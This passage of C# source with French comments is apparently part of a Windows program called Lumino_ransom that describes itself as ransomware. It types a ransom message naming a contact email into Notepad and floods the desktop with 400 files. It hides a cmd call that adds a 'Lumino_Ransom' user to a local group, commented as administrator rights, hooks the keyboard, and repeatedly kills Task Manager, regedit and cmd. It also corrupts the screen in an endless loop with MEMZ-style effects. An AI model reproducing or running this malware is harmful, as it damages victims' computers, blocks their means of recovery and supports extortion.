                SendKeys.Send("FR: {ENTER}Salut !!! {ENTER}Vos fichier on été encypté par le ransomware: Lumino_ransom, si tu veux les décryptés, envoie moi un mail avec ton nom d'utilisateur à ware.ransom@yahoo.com et je te donnerais le mot de passe (gratuitement ;) qu'il faudra entrer dans Lumino_decrypt ! Par contre, t'as pas de chance, c'est la version Hard mon Ransomware que j'ai crée donc...");                     // Envoyer le message de signalement de la contamination + mail dans le bloc-note (Version Française)
                SendKeys.Send("{ENTER} {ENTER}The window/notepad gonna be closed automaticaly after 20 secondes !");                                                                                                                                                                                                                                                                                                                    // Envoyer le message de fermeture automatique dans le bloc-note (Version Anglaise)
                SendKeys.Send("{ENTER}La fenettre/le bloc note vas être fermé(e) automatiquement après 20 secondes !");                                                                                                                                                                                                                                                                                                                 // Envoyer le message de fermeture automatique dans le bloc-note (Version Française)
                this._gHook.Stop_mouse();                                                                                                                                                                                                                                                                                                                                                                                               // Arrêter le hook de la souris (pour que la souris peut bouger à nouveau)
                System.Threading.Thread.Sleep(20000);                                                                                                                                                                                                                                                                                                                                                                                   // Attendre 20 secondes pour laisser le temps à l'utilisateur de lire le message/ le copier
                SendKeys.Send("%+{F4}{RIGHT}{ENTER}");                                                                                                                                                                                                                                                                                                                                                                                  // Fermer le bloc-note avec Alt+F4 (%+{F4})
            }
            catch (System.ComponentModel.Win32Exception) { }; // Si le bloc-note n'est pas ouvert, ne rien faire


        }

        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        public void FileLumine() // Création de 400 fichiers Lumine sur le bureau de l'utilisateur
        {
            try 
            {
                int compteur = 0;                                                                       // compteur de fichier dans la variable compteur
                int number_txt = 1;                                                                     // numéro du fichier dans la variable number_txt
                while (compteur < 400)                                                                  // tant que le compteur est inférieur à 400
                {
                    string fichier = "\\Desktop\\Lumine";                                               // déclaration de la variable fichier qui contient le chemin du fichier à créer
                    string FileDeskpath = userDir + userName + fichier + number_txt;                    // déclaration de la variable FileDeskpath qui contient le chemin du fichier à créer : chemin de l'utilisateur + le nom de l'utilisateur + le chemin du fichier + le numéro du fichier
                    number_txt++;                                                                       // ajout d'une unité du numéro du fichier
                    System.IO.File.Create(FileDeskpath);                                                // création du fichier avec le chemin de la variable FileDeskpath (Bureau de l'utilisateur)
                    compteur++;                                                                         // ajout d'une unité au compteur


                }
            }
            catch (System.IO.IOException) { };                                                          // si le fichier existe déjà, on passe à la suite
        }



        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        ///
        public void Programtxt() // Ouverture d'un bloc note (avec le texte de l'explication du virus après)
        {
            Process mtd = new Process();                                    // déclaration de la variable mtd qui permet d'ouvrir un processus
            mtd.StartInfo.FileName = "notepad.exe";                         // déclaration du fichier à ouvrir (ici notepad.exe)
            mtd.StartInfo.Arguments = "Lumino Helper";                      // déclaration des arguments à passer au fichier (ici Lumino Helper)
            mtd.StartInfo.WindowStyle = ProcessWindowStyle.Maximized;       // déclaration du style de la fenêtre (ici maximisé)
            mtd.Start();                                                    // éxécution du processus mtd avec les paramètres définis ci-dessus
            System.Threading.Thread.Sleep(500);                             // pause de 500ms (0.5s, pour laisser le temps au processus de s'ouvrir)
            SendKeys.Send("{ENTER}");                                       // envoi de la touche "Entrée" pour passer à la ligne
            System.Threading.Thread.Sleep(2000);                            // pause de 2000ms (2s, pour laisser le temps au processus de charger et continuer l'éxécution du code)
        }


        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

       

        [DllImport("user32.dll", EntryPoint = "SystemParametersInfo")]                                              // importation de la fonction systemparametersinfo de user32.dll qui permet de changer le curseur de la souris
        public static extern bool SystemParametersInfo(uint uiAction, uint uiParam, uint pvParam, uint fWinIni);    // déclaration de la fonction systemparametersinfo pour pouvoir l'utiliser dans le programme

        const int SPI_SETCURSORS = 0x0057;                                                                          // déclaration de la constante SPI_SETCURSORS qui permet de changer le curseur de la souris
        const int SPIF_UPDATEINIFILE = 0x01;                                                                        // déclaration de la constante SPIF_UPDATEINIFILE qui permet de mettre à jour le fichier ini
        const int SPIF_SENDCHANGE = 0x02;                                                                           // déclaration de la constante SPIF_SENDCHANGE qui permet d'envoyer un message à tous les composants de l'application

        const string regKey = "HKEY_CURRENT_USER\\Control Panel\\Cursors";                                          // déclaration de la constante regKey qui permet de définir la clé de registre à modifier
        const string WIN_CUR_PATH = "C:\\Windows\\Cursors";                                                         // déclaration de la constante WIN_CUR_PATH qui permet de définir le chemin d'accès des curseurs de windows

        readonly string[] CURSOR_NAMES = {                                                                          // déclaration du tableau CURSOR_NAMES qui permet de définir les noms des curseurs
                "Lumino.cur"         //Selection Normale
        };

        private void Cursor_Changer() // Création de la fonction qui va changer du curseur de la souris
        {
            string cbCursorSize = "15";                                             // déclaration de la variable cbCursorSize qui permet de définir la taille du curseur (ici 15 = 32x32 = le plus grand possible)
            int cursorSize = Int32.Parse(cbCursorSize);                             // conversion de la variable cbCursorSize en Int32 (entier int) et stocker dans la variable cursorSize
            int parsedCursorSize = 0x20 + 0x10 * (cursorSize - 1);                  // déclaration de la variable parsedCursorSize qui permet de calculer la taille du curseur ( 0x20 + 0x10 * ("15" - 1) = 0x20 + 0x10 * 14 = 0x20 + 0xE0 = 0x100 = 256) à définir dans la fonction SystemParametersInfo
            //0x2029 not documented windows SPI number to change cursor size 
            SystemParametersInfo(0x2029, 0, (uint)parsedCursorSize, 0x01);          // appel de la fonction systemparametersinfo avec les paramètres suivants : SPI_SETCURSORS, 0, parsedCursorSize, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE pour changer la taille du curseur
            try                                                                     // tentative de copie des curseurs dans le dossier windows
            {
                string folder_name = new DirectoryInfo("Lumino").Name;                   // déclaration de la variable folder_name qui permet de définir le nom du dossier qui va contenir les curseurs
                string cursor_shceme = "";                                               // déclaration de la variable cursor_shceme qui permet de définir le nom du curseur

                foreach (string val in CURSOR_NAMES)                                          // pour chaque curseur dans le tableau CURSOR_NAMES, on stocke chaque curseur dans la variable val un par un
                {

                    string cursorPath = val;                                                                                            // déclaration de la variable cursorPath qui permet de définir le chemin d'accès du curseur par le nom du curseur

                    string currentCursorPath = WIN_CUR_PATH + '\\' + folder_name + "_" + val;                                           // déclaration de la variable currentCursorPath qui permet de définir le chemin d'accès du curseur par le nom du dossier + le nom du curseur
                    cursor_shceme += currentCursorPath + ",";                                                                           // ajout de la variable currentCursorPath et ',' pour définir le nom du curseur
                    File.Copy(cursorPath, currentCursorPath, true);                                                                     // copie du curseur dans le dossier Windows, si le curseur existe déjà, on le remplace
                    Registry.SetValue(regKey, "Arrow", currentCursorPath);                                                              // définir la valeur de la clé de registre "Arrow" par le chemin d'accès du curseur
                    SystemParametersInfo(SPI_SETCURSORS, 0, 0, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);                                   // appel de la fonction systemparametersinfo avec les paramètres suivants : SPI_SETCURSORS ( pour changer le curseur ), 0, 0, SPIF_UPDATEINIFILE (mettre à jour les info des fichiers) | SPIF_SENDCHANGE ( pour mettre à jour le fichier ini et envoyer un message à tous les composants de l'application )
                }
                SystemParametersInfo(SPI_SETCURSORS, 0, 0, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);                                       // appel de la fonction systemparametersinfo avec les paramètres suivants : SPI_SETCURSORS ( pour changer le curseur ), 0, 0, SPIF_UPDATEINIFILE (mettre à jour les info des fichiers) | SPIF_SENDCHANGE ( pour mettre à jour le fichier ini et envoyer un message à tous les composants de l'application )
                System.Threading.Thread.Sleep(5);                                                                                       // pause de 5ms (pour éviter les erreurs et laisser correctement le temps à la fonction de changer le curseur)
                Registry.SetValue(regKey + "\\Schemes", folder_name, cursor_shceme.TrimEnd(), RegistryValueKind.ExpandString);          // définir la valeur de la clé de registre "Schemes" par le nom du dossier + le nom du curseur
                SystemParametersInfo(SPI_SETCURSORS, 0, 0, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);                                       // appel de la fonction systemparametersinfo avec les paramètres suivants : SPI_SETCURSORS ( pour changer le curseur ), 0, 0, SPIF_UPDATEINIFILE (mettre à jour les info des fichiers) | SPIF_SENDCHANGE ( pour mettre à jour le fichier ini et envoyer un message à tous les composants de l'application )
            }
            catch (System.IO.FileNotFoundException) { }                             // si le fichier n'est pas trouvé, on ne fait rien                       -|
            catch (System.IO.IOException) { }                                       // si il y a un problème dans la lib IO, on ne fait rien                  |
            catch (System.UnauthorizedAccessException) { }                          // si on a pas l'autorisation necessaire, on ne fait rien                 |---| si il y a une erreur,
            catch (System.Security.SecurityException) { }                           // si il y a un problème de sécurité, on ne fait rien                     |---| on ne fait rien
            catch (SystemException) { }                                             // si il y a une exception système, on ne fait rien                       |
            catch (Exception) { }                                                   // si tout autre exceptions, on ne fait rien                             -|
        }

        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        ///
        private readonly UserActivityHook _gHook = new UserActivityHook();      // initialisation de la variable _gHook qui permet d'appeler les fonctions dans la classe UserActivityHook qui se trouve dans le dossier \System\UserActivityHook.cs du projet
        private readonly CMD_class CMD = new CMD_class();                       // initialisation de la variable CMD qui permet d'appeler les fonctions dans la classe CMD_class qui se trouve dans le dossier \System\CMD.cs du projet
        private readonly ASCII_class Ascii = new ASCII_class();                 // initialisation de la variable Ascii qui permet d'appeler les fonctions dans la classe ASCII_class qui se trouve dans le dossier \Effect User\ASCII.cs du projet
        private readonly Anim_NCS anim_NCS = new Anim_NCS();                    // initialisation de la variable anim_NCS qui permet d'appeler les fonctions dans la classe Anim_NCS qui se trouve dans le dossier \Effect User\Anim_NCS.cs du projet
        private readonly Disable_All Disable = new Disable_All();               // initialisation de la variable Disable qui permet d'appeler les fonctions dans la classe Disable_All qui se trouve dans le dossier \System\Disable_All.cs du projet
        
        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        public void Vertex_Main() // rendre l'explorer illisible/inutilisable par des rectangles R-G-B et jaune Or
        {
            SHDocVw.ShellWindows shellWindows = new SHDocVw.ShellWindows();                                     // initialisation de la variable shellWindows qui permet de récupérer les fenêtres ouvertes 
            string filename;                                                                                    // initialisation de la variable filename qui permet de récupérer le nom de la fenêtre ouverte
            ArrayList windows = new ArrayList();                                                                // initialisation de la variable windows qui permet de récupérer les fenêtres ouvertes dans un tableau

            int infini = 2;                                                                                     // initialisation de la variable infini qui permet de faire une boucle infinie (2)
            while (infini > 1)                                                                                  // boucle infinie car infini est toujours supérieur à 1
            {
                foreach (SHDocVw.InternetExplorer explorerwindow in shellWindows)                           // pour chaque fenêtre ouverte dans shellWindows
                {
                    filename = Path.GetFileNameWithoutExtension(explorerwindow.FullName).ToLower();     // récupération du nom complet de la fenêtre ouverte
                    if (filename.Equals("explorer"))                                                    // si le nom de la fenêtre ouverte est explorer
                    {
                        windows.Add(explorerwindow.HWND);                                        // ajouter la fenêtre ouverte dans le tableau windows
                        Graphics g = Graphics.FromHwnd((IntPtr)explorerwindow.HWND);             // initialisation de la variable g qui permet de dessiner des rectangles sur la fenêtre ouverte

                        g.FillRectangle(Brushes.Blue, new Rectangle(4, 26, 10000, 10000));       // dessiner un rectangle bleu sur la fenêtre ouverte (la même taille que la fenêtre)              -|
                        System.Threading.Thread.Sleep(50);                                       // attendre 50ms (0.05s)                                                                           |
                        g.FillRectangle(Brushes.Red, new Rectangle(4, 26, 10000, 10000));        // dessiner un rectangle rouge sur la fenêtre ouverte (la même taille que la fenêtre)              |
                        System.Threading.Thread.Sleep(50);                                       // attender 50ms (0.05s)                                                                           | --> retcangle bleu, rouge, vert, jaune qui se superposent en boucle infinie tout en faisant un effet 
                        g.FillRectangle(Brushes.Green, new Rectangle(4, 26, 10000, 10000));      // dessiner un rectangle vert sur la fenêtre ouverte (la même taille que la fenêtre)               |   de clignotement toutes les 150ms (0.15s) sur la fenêtre ouverte (explorer.exe = explorateur Windows)
                        System.Threading.Thread.Sleep(50);                                       // attendre 50ms (0.05s)                                                                           |
                        g.FillRectangle(Brushes.Gold, new Rectangle(4, 26, 10000, 10000));       // dessiner un rectangle jaune sur la fenêtre ouverte (la même taille que la fenêtre)             -|
                    }

                    infini = infini++;                                                                      // infini est toujours supérieur à 1 donc la boucle infinie continue

                }
            }
        }


        public void CreateUser_Admin(string UserPass) // Création d'un utilisateur avec les droits administrateur
        {
            string commande = "/C net localgroup Lumino_Ransom " + UserPass + " /add"; // Ajout de l'utilisateur "Lumino_Ransom" au groupe Administrateur avec un mot de passe défini pas la variable "UserPass"
            System.Threading.Thread.Sleep(1000);                                       // Pause de 1 seconde
            Process mtd = new Process();                                               // Création d'un nouveau processus "mtd"
            mtd.StartInfo.FileName = "cmd.exe";                                        // Définir le nom du programme à exécuter dans "mtd" qui est "cmd.exe"
            mtd.StartInfo.Arguments = commande;                                        // Définir les arguments de la commande à exécuter dans "mtd" qui est "commande"
            mtd.StartInfo.UseShellExecute = true;                                      // Définir l'utilisation du shell dans "mtd" à "true"
            mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;                     // Définir le style de la fenêtre de "mtd" à "hidden"
            mtd.Start();                                                               // Exécuter le programme "mtd"
            mtd.Close();                                                               // Fermer le programme "mtd"
        }

        

        [DllImport("user32.dll")]                                                                                 // Importer la fonction GetDesktopWindow() de user32.dll
        static extern IntPtr GetDesktopWindow();                                                                  // Déclarer la fonction GetDesktopWindow() de user32.dll

        [DllImport("user32.dll")]                                                                                 // Importer la fonction GetWindowDC() de user32.dll
        static extern IntPtr GetWindowDC(IntPtr hWnd);

        [DllImport("Shell32.dll", EntryPoint = "ExtractIconExW", CharSet = CharSet.Unicode, ExactSpelling = true, // Importer la fonction ExtractIconEx() de Shell32.dll
        CallingConvention = CallingConvention.StdCall)]                                                           // Déclarer la fonction ExtractIconEx() de Shell32.dll
        private static extern int ExtractIconEx(string sFile, int iIndex, out IntPtr piLargeVersion,              // Déclarer la fonction ExtractIconEx() de Shell32.dll
        out IntPtr piSmallVersion, int amountIcons);                                                              // Déclarer la fonction ExtractIconEx() de Shell32.dll

        [DllImport("user32.dll")]                                                                                 // Importer la fonction ReleaseDC() de user32.dll
        static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);                               // Déclarer la fonction ReleaseDC() de user32.dll

        [DllImport("gdi32.dll")]                                                                                  // Importer la fonction BitBlt() de gdi32.dll
        static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest,         // Déclarer la fonction BitBlt() de gdi32.dll
        int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc,          // Déclarer la fonction BitBlt() de gdi32.dll
        TernaryRasterOperations dwRop);                                                                           // Déclarer la fonction BitBlt() de gdi32.dll

        public enum TernaryRasterOperations // nouvelle énumération
        {
            SRCCOPY = 0x00CC0020,     // Copie la source directement dans la destination
            SRCPAINT = 0x00EE0086,    // Copie la source dans la destination en utilisant un masque de couleur de la destination
            SRCAND = 0x008800C6,      // Copie la source dans la destination en utilisant un masque de couleur de la source
            SRCINVERT = 0x00660046,   // Copie la source dans la destination en inversant la couleur de la source
            SRCERASE = 0x00440328,    // Copie la source dans la destination en inversant la couleur de la source et en utilisant un masque de couleur de la destination
            NOTSRCCOPY = 0x00330008,  // Copie la destination dans la source en inversant la couleur de la source
            NOTSRCERASE = 0x001100A6, // Copie la destination dans la source en inversant la couleur de la source et en utilisant un masque de couleur de la destination
            MERGECOPY = 0x00C000CA,   // Copie la source dans la destination en utilisant un masque de couleur de la source
            MERGEPAINT = 0x00BB0226,  // Copie la source et la destination dans la destination en utilisant un masque de couleur
            PATCOPY = 0x00F00021,     // Copie le motif de la brosse dans la destination en utilisant un masque de couleur de la destination
            PATPAINT = 0x00FB0A09,    // Copie le motif de la brosse dans la destination en utilisant un masque de couleur de la source ou de la destination, mais pas les deux 
            PATINVERT = 0x005A0049,   // Copie le motif de la brosse dans la destination en inversant la couleur de la source et en utilisant un masque de couleur de la destination
            DSTINVERT = 0x00550009,   // Copie la destination dans la source en inversant la couleur de la destination
            BLACKNESS = 0x00000042,   // Remplit la destination avec la couleur noire
            WHITENESS = 0x00FF0062,   // Remplit la destination avec la couleur blanche
        }

        public static Icon Extract(string file, int number, bool largeIcon)
        {
            ExtractIconEx(file, number, out IntPtr large, out IntPtr small, 1); // Extraire l'icône selon le fichier et le numéro de l'icône
            try
            {
                return Icon.FromHandle(largeIcon ? large : small); // Retourner l'icône extraite
            }
            catch
            {
                return null; // ignorer si l'extraction ne retourne rien
            }
        }



        public void Gdi_Load()
        {
            timer1.Start(); // timer1 = copier l'écran et le mettre un l'infini                     |
            timer2.Start(); // timer2 = mettre des icones Buggé dans la souris                      |--|    GDI Effects 
            timer3.Start(); // timer3 = inverser les couleurs l'écran par intervalles irréguliers   |--| comme le virus "MEMZ"
            timer4.Start(); // timer4 = copier une partie de l'écran et l'inverser                  |
        }

        Random r; // créer un random "r"

        public void Timer1_Tick(object sender, EventArgs e) // copier l'écran et le mettre un l'infini
        {
            r = new Random();              // initialiser un random "r"
            if (timer1.Interval > 300)     // si l'intervale du timer1 est plus grand que 300
            {
                timer1.Interval -= 150;                                                                                                     // diminuer l'intervale du timer1 de 150
                IntPtr hwnd = GetDesktopWindow();                                                                                           // récupérer le handle de la fenêtre du bureau
                IntPtr hdc = GetWindowDC(hwnd);                                                                                             // récupérer le handle du contexte de la fenêtre du bureau
                int x = Screen.PrimaryScreen.Bounds.Width;                                                                                  // récupérer la largeur de l'écran
                int y = Screen.PrimaryScreen.Bounds.Height;                                                                                 // récupérer la hauteur de l'écran
                StretchBlt(hdc, r.Next(10), r.Next(10), x - r.Next(25), y - r.Next(25), hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);  // copier une partie de l'écran et la mettre dans une autre partie de l'écran
                StretchBlt(hdc, x, 0, -x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);                                             // copier l'écran et le mettre à l'envers
                StretchBlt(hdc, 0, y, x, -y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);                                             // copier l'écran et le mettre à l'envers
            }
            else if (timer1.Interval > 151) // sinon si l'intervale du timer1 est plus grand que 151
            {
                timer1.Interval -= 100;                                                                                                     // diminuer l'intervale du timer1 de 100
                IntPtr hwnd = GetDesktopWindow();                                                                                           // récupérer le handle de la fenêtre du bureau
                IntPtr hdc = GetWindowDC(hwnd);                                                                                             // récupérer le handle du contexte de la fenêtre du bureau
                int x = Screen.PrimaryScreen.Bounds.Width;                                                                                  // récupérer la largeur de l'écran
                int y = Screen.PrimaryScreen.Bounds.Height;                                                                                 // récupérer la hauteur de l'écran
                StretchBlt(hdc, r.Next(10), r.Next(10), x - r.Next(25), y - r.Next(25), hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);  // copier une partie de l'écran et la mettre dans une autre partie de l'écran
                StretchBlt(hdc, x, 0, -x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);                                             // copier l'écran et le mettre à l'envers
                StretchBlt(hdc, 0, y, x, -y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);                                             // copier l'écran et le mettre à l'envers
            }
            else                           // sinon
            {
                timer1.Interval = 5;                                                                                                        // mettre l'intervale du timer1 à 5
                IntPtr hwnd = GetDesktopWindow();                                                                                           // récupérer le handle de la fenêtre du bureau
                IntPtr hdc = GetWindowDC(hwnd);                                                                                             // récupérer le handle du contexte de la fenêtre du bureau
                int x = Screen.PrimaryScreen.Bounds.Width;                                                                                  // récupérer la largeur de l'écran
                int y = Screen.PrimaryScreen.Bounds.Height;                                                                                 // récupérer la hauteur de l'écran
                StretchBlt(hdc, r.Next(10), r.Next(10), x - r.Next(25), y - r.Next(25), hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);  // copier une partie de l'écran et la mettre dans une autre partie de l'écran
                StretchBlt(hdc, x, 0, -x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);                                             // copier l'écran et le mettre à l'envers
                StretchBlt(hdc, 0, y, x, -y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);                                             // copier l'écran et le mettre à l'envers

            }
        }

        readonly Icon icon = Extract("shell32.dll", 235, true);// récupérer l'icone du dossier "Mes documents"

        public void Timer2_Tick(object sender, EventArgs e)    // Ttimer2 = mettre des icones bugées dans le curseur
        {
            this.Cursor = new Cursor(Cursor.Current.Handle);   // mettre le curseur à l'endroit où il est
            int posX = Cursor.Position.X;                      // récupérer la position X du curseur
            int posY = Cursor.Position.Y;                      // récupérer la position Y du curseur

            IntPtr desktop = GetWindowDC(IntPtr.Zero);         // récupérer le handle du contexte de la fenêtre du bureau
            using (Graphics g = Graphics.FromHdc(desktop))     // créer un objet Graphics à partir du handle du contexte de la fenêtre du bureau
            {
                g.DrawIcon(icon, posX, posY);                  // dessiner l'icone à la position du curseur
            }
        }

        public void Timer3_Tick(object sender, EventArgs e)   // Timer3 = inverser les couleurs l'écran par intervalles irrégulier
        {
            r = new Random();                                                                 // créer un objet Random
            IntPtr hwnd = GetDesktopWindow();                                                 // récupérer le handle de la fenêtre du bureau
            IntPtr hdc = GetWindowDC(hwnd);                                                   // récupérer le handle du contexte de la fenêtre du bureau
            int x = Screen.PrimaryScreen.Bounds.Width;                                        // récupérer la largeur de l'écran
            int y = Screen.PrimaryScreen.Bounds.Height;                                       // récupérer la hauteur de l'écran
            StretchBlt(hdc, 0, 0, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.NOTSRCCOPY); // inverser les couleurs de l'écran
            timer3.Interval = r.Next(5000);                                                   // mettre l'intervale du timer3 à un nombre aléatoire entre 0 et 5000
        }

        public void Timer4_Tick(object sender, EventArgs e)  // Timer4 = copier une partie de l'écran, inverser ses couleurs et la mettre dans une autre partie de l'écran par intervalles irrégulier
        {
            r = new Random();                                                                                                             // créer un objet Random
            IntPtr hwnd = GetDesktopWindow();                                                                                             // récupérer le handle de la fenêtre du bureau
            IntPtr hdc = GetWindowDC(hwnd);                                                                                               // récupérer le handle du contexte de la fenêtre du bureau
            int x = Screen.PrimaryScreen.Bounds.Width;                                                                                    // récupérer la largeur de l'écran
            int y = Screen.PrimaryScreen.Bounds.Height;                                                                                   // récupérer la hauteur de l'écran
            StretchBlt(hdc, r.Next(x), r.Next(y), x = r.Next(500), y = r.Next(500), hdc, 0, 0, x, y, TernaryRasterOperations.NOTSRCCOPY); // copier une partie de l'écran, inverser ses couleurs et la mettre dans une autre partie de l'écran
            timer4.Interval = r.Next(1000);                                                                                               // mettre l'intervale du timer4 à un nombre aléatoire entre 0 et 1000
            //InvalidateRect(IntPtr.Zero, IntPtr.Zero, true); // mettre à jour l'écran (effacer l'écran et le redessiner)
        }

        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        public void Finish_infini() // Fin du Virus en infini qui embête l'utilisateur
        {
            string cbCursorSize = "1";                                             // déclaration de la variable cbCursorSize qui permet de définir la taille du curseur (ici 1 = normal)
            int cursorSize = Int32.Parse(cbCursorSize);                            // conversion de la variable cbCursorSize en Int32 (entier int) et stocker dans la variable cursorSize
            int parsedCursorSize = 0x20 + 0x10 * (cursorSize - 1);                 // déclaration de la variable parsedCursorSize qui permet de calculer la taille du curseur (0x20 + 0x10 * (cursorSize - 1) = 0x20 + 0x10 * (1 - 1) = 0x20 + 0x10 * 0 = 0x20 + 0x00 = 0x20 = 32)
            //0x2029 not documented windows SPI number to change cursor size
            SystemParametersInfo(0x2029, 0, (uint)parsedCursorSize, 0x01);         // déclaration de la fonction "SystemParametersInfo" qui permet de changer la taille du curseur en 1 [normal] (0x2029 = 0x20 + 0x10 * (cursorSize - 1) = 0x20 + 0x10 * (1 - 1) = 0x20 + 0x10 * 0 = 0x20 + 0x00 = 0x20 = 32)
            int infini = 2;                                                        // déclaration de la variable "infini" à 2 qui permet de faire une boucle infini
            while (infini > 1)                                                     // boucle infini car la variable "infini" est toujours plus grand que 1 (infini = 2)
            {
                try // Le 'try' est là par précaution au cas où si une des fonction ne fonctionne pas/ n'a pas d'autorisation ou autre 
                {
                    timer1.Stop();                                                                                                                                                                                               // Arrêt du timer1 ( timer1 = copier l'écran et le mettre un l'infini, comme le virus Memz)
                    CMD.CMD_rtc();                                                                                                                                                                                              // Mettre fin au processus (taskkill): CMD; Regedit(Registre); Taskmrg (Gestionnaires des taches) pour que l'utilisateur ne puisse pas nuire au virus
                    Random aleatoire = new Random();                                                                                                                                                                           // Déclaration de la variable "aleatoire" qui permet de générer un nombre aléatoire
                    int entier = aleatoire.Next(30001);                                                                                                                                                                       // Déclaration de la variable "entier" qui permet de stocker le nombre aléatoire généré par la variable "aleatoire" (aleatoire.Next(30001) = nombre aléatoire entre 0 et 30000)
                    anim_NCS.Del_NCS_Ani2();                                                                                                                                                                                 // Mettre la deuxième animation + son (Bip) sur les Led : Num, Caps et Scroll [ animation plus rapide que la première ]
                    /*                                                                                                                                                                                                      //#                                                                                                                                                                                                                                                     */
                    cbCursorSize = "15";                                                                                                                                                                                   // Déclaration de la variable cbCursorSize qui permet de définir la taille du curseur (ici 15 = le plus grand)-------------------------------------------------------------------------------------------------------------------------------------------|
                    cursorSize = Int32.Parse(cbCursorSize);                                                                                                                                                               // Conversion de la variable cbCursorSize en Int32 (entier int) et stocker dans la variable cursorSize                                                                                                                                                    |--| Modifier la taille du  | = --> Embêter l'utilisateur
                    parsedCursorSize = 0x20 + 0x10 * (cursorSize - 1);                                                                                                                                                   // Déclaration de la variable parsedCursorSize qui permet de calculer la taille du curseur (0x20 + 0x10 * (cursorSize - 1) = 0x20 + 0x10 * (15 - 1) = 0x20 + 0x10 * 14 = 0x20 + 0x140 = 0x160 = 352)                                                       |--| curseur de la souris   |             (C.|E|.L)
                    SystemParametersInfo(0x2029, 0, (uint)parsedCursorSize, 0x01);                                                                                                                                      // Déclaration de la fonction "SystemParametersInfo" qui permet de changer la taille du curseur en 15 [le plus grand] (0x2029 = 0x20 + 0x10 * (cursorSize - 1) = 0x20 + 0x10 * (15 - 1) = 0x20 + 0x10 * 14 = 0x20 + 0x140 = 0x160 = 352)--------------------|
                    /*                                                                                                                                                                                                 //#                                                                                                                                                                                                                                                          */
                    CMD.CMD_rtc();                                                                                                                                                                                    // Mettre fin au processus (taskkill): CMD; Regedit(Registre); Taskmrg (Gestionnaires des taches) pour que l'utilisateur ne puisse pas nuire au virus = --> Limiter (C.E.|L|)
                    System.Threading.Thread.Sleep(entier--);                                                                                                                                                         // Mettre en pause le programme pendant le temps aléatoire généré par la variable "entier" (entier--)
                    /*                                                                                                                                                                                              //#                                                                                                                                                                                                                                                             */
                    System.Diagnostics.Process.Start("https://www.bing.com/search?ptag=ICO-e5da190ded9a292e&form=INCOH1&pc=1CDT&q=Ransomware");                                                                    // Ouverture de la page Bing avec le mot clé (recherche) "Ransomware" grace à la fonction "System.Diagnostics.Process.Start" qui permet d'ouvir un programme ou un lien internet --> Embêter l'utilisateur (C.|E|.L)
                    /*                                                                                                                                                                                            //#                                                                                                                                                                                                                                                               */
                    timer1.Start();                                                                                                                                                                              // Redémarrage du timer1 ( timer1 = copier l'écran et le mettre un l'infini)---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
                    timer2.Start();                                                                                                                                                                             // Redémarrage du timer2 ( timer2 = mettre des icones dans la souris en Bug)                                                                                                                                                                                        |--| Ref virus
                    timer3.Start();                                                                                                                                                                            // Redémarrage du timer3 ( timer3 = inverser les couleurs de tout l'écran à des intervalles irréguliers)                                                                                                                                                             |--|   MEMZ
                    timer4.Start();                                                                                                                                                                           // Redémarrage du timer4 ( timer4 = copier une partie de m'écran, inverser les couleurs et l'afficher sur l'écran au hasard)------------------------------------------------------------------------------------------------------------------------------------------|
                    /*                                                                                                                                                                                       //#                                                                                                                                                                                                                                                                    */
                    this._gHook.Start_key();                                                                                                                                                                // Démarrage du hook clavier (hook clavier = intercepter les touches du clavier) pour bloquer les touches du clavier
                    /*                                                                                                                                                                                     //#                                                                                                                                                                                                                                                                      */
                    cbCursorSize = "1";                                                                                                                                                                   // Déclaration de la variable cbCursorSize qui permet de définir la taille du curseur (ici 1 = le plus petit)-------------------------------------------------------------------------------------------------------------------------------------------------------------|
                    cursorSize = Int32.Parse(cbCursorSize);                                                                                                                                              // Conversion de la variable cbCursorSize en Int32 (entier int) et stocker dans la variable cursorSize                                                                                                                                                                     |--| Modifier la taille du | = --> Embêter l'utilisateur
                    parsedCursorSize = 0x20 + 0x10 * (cursorSize - 1);                                                                                                                                  // Déclaration de la variable parsedCursorSize qui permet de calculer la taille du curseur (0x20 + 0x10 * (cursorSize - 1) = 0x20 + 0x10 * (1 - 1) = 0x20 + 0x10 * 0 = 0x20 + 0x0 = 0x20 = 32)                                                                              |--| curseur de la souris  |             (C.|E|.L)
                    SystemParametersInfo(0x2029, 0, (uint)parsedCursorSize, 0x01);                                                                                                                     // Déclaration de la fonction "SystemParametersInfo" qui permet de changer la taille du curseur en 1 [le plus petit] (0x2029 = 0x20 + 0x10 * (cursorSize - 1) = 0x20 + 0x10 * (1 - 1) = 0x20 + 0x10 * 0 = 0x20 + 0x0 = 0x20 = 32)--------------------------------------------|
                    /*                                                                                                                                                                                //#                                                                                                                                                                                                                                                                           */
                    System.Threading.Thread.Sleep(entier++);                                                                                                                                         // Mettre en pause le programme pendant le temps aléatoire généré par la variable "entier" (entier++)
